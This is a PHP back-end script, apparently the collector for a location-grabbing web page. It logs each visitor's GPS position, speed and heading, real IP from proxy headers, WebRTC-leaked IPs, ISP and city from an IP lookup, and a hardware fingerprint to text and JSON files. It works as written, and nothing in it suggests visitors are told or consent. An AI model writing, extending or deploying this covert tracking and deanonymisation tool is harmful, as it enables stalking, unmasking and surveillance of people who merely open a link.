<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/plain');

// ============================================================
// 🆕 REAL IP CAPTURE (server-side — frontend se fake nahi)
// ============================================================
function getRealIP() {
    // Cloudflare
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return trim($_SERVER['HTTP_CF_CONNECTING_IP']);
    }
    // Nginx / proxy
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return trim($_SERVER['HTTP_X_REAL_IP']);
    }
    // Standard proxy chain (first IP = client)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    // Fallback
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

$realIP = getRealIP();
$time   = date('Y-m-d H:i:s');

// ============================================================
// 📥 COLLECT INPUTS (purane + naye — dono support)
// ============================================================
$lat     = $_POST['lat']     ?? '';
$lon     = $_POST['lon']     ?? '';
$acc     = $_POST['acc']     ?? '';
$alt     = $_POST['alt']     ?? '';
$heading = $_POST['heading'] ?? '';
$speed   = $_POST['speed']   ?? '';
$device  = $_POST['device']  ?? '{}';
$webrtc  = $_POST['webrtc']  ?? '';
$clientTime = $_POST['time'] ?? '';

// purana fallback (agar frontend purana ho)
$oldIP = $_POST['ip'] ?? '';

// ============================================================
// 🌍 IP INTELLIGENCE (country, city, ISP, ASN)
// ============================================================
$ipGeo = null;
if ($realIP && $realIP !== 'unknown' && filter_var($realIP, FILTER_VALIDATE_IP)) {
    $ctx = stream_context_create([
        'http' => ['timeout' => 3, 'ignore_errors' => true]
    ]);
    $raw = @file_get_contents(
        "http://ip-api.com/json/{$realIP}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query",
        false, $ctx
    );
    if ($raw) {
        $decoded = json_decode($raw, true);
        if (is_array($decoded) && ($decoded['status'] ?? '') === 'success') {
            $ipGeo = $decoded;
        }
    }
}

// ============================================================
// 📱 PARSE DEVICE INTEL
// ============================================================
$deviceData = json_decode($device, true);
if (!is_array($deviceData)) $deviceData = [];

// ============================================================
// 💾 BUILD STRUCTURED ENTRY (JSON)
// ============================================================
$entry = [
    'time'   => $time,
    'client_time' => $clientTime,
    'ip'     => [
        'address'  => $realIP,
        'country'  => $ipGeo['country']     ?? '?',
        'countryCode' => $ipGeo['countryCode'] ?? '?',
        'region'   => $ipGeo['regionName']  ?? '?',
        'city'     => $ipGeo['city']        ?? '?',
        'zip'      => $ipGeo['zip']         ?? '?',
        'isp'      => $ipGeo['isp']         ?? '?',
        'org'      => $ipGeo['org']         ?? '?',
        'asn'      => $ipGeo['as']          ?? '?',
        'ip_lat'   => $ipGeo['lat']         ?? '?',
        'ip_lon'   => $ipGeo['lon']         ?? '?',
        'timezone' => $ipGeo['timezone']    ?? '?',
        'old_fake_ip' => $oldIP // frontend se aaya tha (reference ke liye)
    ],
    'gps'    => [
        'lat'     => $lat,
        'lon'     => $lon,
        'acc'     => $acc,
        'alt'     => $alt,
        'heading' => $heading,
        'speed'   => $speed,
        'maps'    => ($lat && $lon) ? "https://www.google.com/maps?q={$lat},{$lon}" : null
    ],
    'webrtc_ips' => $webrtc,
    'device' => $deviceData,
    'headers' => [
        'user_agent'    => $_SERVER['HTTP_USER_AGENT']      ?? '',
        'accept_lang'   => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
        'referer'       => $_SERVER['HTTP_REFERER']         ?? '',
        'host'          => $_SERVER['HTTP_HOST']            ?? ''
    ]
];

// ============================================================
// 📝 BUILD READABLE ENTRY (TXT — purana format + naya)
// ============================================================
$ipLoc = trim(($ipGeo['city'] ?? '?') . ', ' . ($ipGeo['country'] ?? '?'), ', ');
$isp   = $ipGeo['isp'] ?? '?';

$readable  = "[$time] IP: {$realIP} ({$ipLoc} | ISP: {$isp})";
$readable .= " | Lat: {$lat}, Lon: {$lon} | Acc: ±{$acc} m";
if ($alt !== '')     $readable .= " | Alt: {$alt}m";
if ($heading !== '') $readable .= " | Heading: {$heading}°";
if ($speed !== '')   $readable .= " | Speed: {$speed}m/s";
$readable .= "\n";

// Device summary line (compact)
if (!empty($deviceData)) {
    $ua  = $deviceData['userAgent']  ?? '?';
    $scr = $deviceData['screen']     ?? '?';
    $cpu = $deviceData['cpuCores']   ?? '?';
    $ram = $deviceData['deviceMemory'] ?? '?';
    $tz  = $deviceData['timezone']   ?? '?';
    $gpu = is_array($deviceData['gpu'] ?? null) ? ($deviceData['gpu']['renderer'] ?? '?') : '?';
    $readable .= "    └─ Device: {$scr} | CPU: {$cpu}c | RAM: {$ram}GB | TZ: {$tz}\n";
    $readable .= "    └─ GPU: {$gpu}\n";
    $readable .= "    └─ UA: {$ua}\n";
}

if ($webrtc) {
    $readable .= "    └─ WebRTC IPs: {$webrtc}\n";
}

// ============================================================
// 💾 SAVE (only if location present — original behaviour)
// ============================================================
if ($lat && $lon) {

    // 1) TXT (readable — original + naya data)
    file_put_contents('locations.txt', $readable, FILE_APPEND | LOCK_EX);

    // 2) JSON (structured — naya)
    file_put_contents(
        'locations.json',
        json_encode($entry, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n",
        FILE_APPEND | LOCK_EX
    );

    // echo same style as original (readable text)
    echo $readable;

} else {
    // Agar location nahi hai lekin device intel hai — sirf device save karo
    if (!empty($deviceData)) {
        $entry['gps']['note'] = 'no GPS — device-only capture';
        file_put_contents(
            'locations.json',
            json_encode($entry, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n",
            FILE_APPEND | LOCK_EX
        );
    }
    http_response_code(400);
    echo "ERROR";
}
?>